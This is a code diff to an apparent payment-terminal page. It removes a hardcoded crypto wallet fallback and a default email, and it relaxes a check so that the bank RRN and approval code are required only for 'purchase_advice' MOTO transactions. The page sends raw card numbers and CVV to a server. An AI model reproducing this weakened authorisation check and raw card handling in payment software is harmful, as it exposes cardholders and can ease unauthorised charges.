@@ -292,7 +292,7 @@ $destinations = [
     'hsbc' => 'HSBC UAE',
     'nbe' => 'NBE Egypt',
     'jpmorgan' => 'JP Morgan IOLTA',
-    'ledger_trx' => 'Ledger TRX — ' . (defined('LEDGER_TRC20_ADDRESS') ? LEDGER_TRC20_ADDRESS : 'TEwLFWlwK55b7PuFfzgH1H2f3xs3pLgLn2'),
+    'ledger_trx' => 'Ledger TRX — ' . (defined('LEDGER_TRC20_ADDRESS') ? LEDGER_TRC20_ADDRESS : ''),
     'tron_w' => $walletAddr ?: 'TRC20 Wallet',
     'erc20_w' => $walletAddr ?: 'ERC20 Wallet',
 ];
@@ -727,7 +727,7 @@ async function payByCard() {
     if (!name) {
         return toast(AR ? 'أدخل اسم حامل البطاقة' : 'Enter cardholder name', 'error');
     }
-    if (MOTO_2D_TYPES.includes(TXN_TYPE) && (!origRef || !authCode)) {
+    if (MOTO_2D_TYPES.includes(TXN_TYPE) && TXN_TYPE === 'purchase_advice' && (!origRef || !authCode)) {
       return toast(AR ? 'أدخل RRN ورمز موافقة البنك' : 'Enter the bank RRN and approval code', 'error');
     }
     
@@ -735,7 +735,6 @@ async function payByCard() {
     btn.innerHTML = '<span class="spin"></span> ' + (AR ? 'جاري المعالجة...' : 'Processing...');
     
     await sendToServer({
-      card_provider: 'paypal',
       payment_type: 'MOTO',
       protocol: '201.3',
         card_number: num,
@@ -746,10 +745,9 @@ async function payByCard() {
       cc_cvv: cvv,
         card_name: name,
       name: name,
-        email: email || 'client@diparmas.com',
+        email: email || '',
         method: 'direct_card',
         orig_ref: origRef,
-        approval_code: authCode,
         approval_code: authCode,
       txn_type: ['auth_hold', 'auth_moto'].includes(TXN_TYPE) ? 'auth' : (TXN_TYPE === 'auth_capture' ? 'auth_complete' : 'purchase'),
       extra: ['auth_hold', 'auth_moto'].includes(TXN_TYPE)
